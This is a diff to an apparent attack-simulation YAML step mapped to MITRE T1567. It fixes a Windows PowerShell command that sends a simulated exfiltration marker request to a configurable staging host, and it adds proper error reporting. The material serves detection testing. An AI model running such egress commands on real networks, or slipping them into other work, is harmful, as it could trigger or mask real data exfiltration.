@@ -180,7 +180,13 @@ steps:
     mitre_technique: "T1567"
     platforms: ["linux", "windows"]
     platform_variants:
-      windows: "powershell.exe -NoProfile -Command \"try { Invoke-WebRequest -UseBasicParsing -Uri http://%STAGE_HOST%/cortexsim-asm-005-exfil-marker -TimeoutSec 5 } catch { }\""
+      # CONT-12: PowerShell never expands %STAGE_HOST%, and the empty catch {}
+      # reported a request that never left as success.
+      windows: |
+        $h = if ($env:STAGE_HOST) { $env:STAGE_HOST } else { '127.0.0.1' }
+        try { Invoke-WebRequest -UseBasicParsing -TimeoutSec 5 -Uri "http://$h/cortexsim-asm-005-exfil-marker" -ErrorAction Stop | Out-Null }
+        catch { Write-Error ("exfil marker request to {0} failed: {1}" -f $h, $_.Exception.Message); exit 1 }
+        Write-Output 'cortexsim-asm-005-exfil-marker-sent'
     # The powershell egress leaves the host; detection is NGFW-side (session log
     # to the collector), stitched to the endpoint chain that produced it.
     causality:
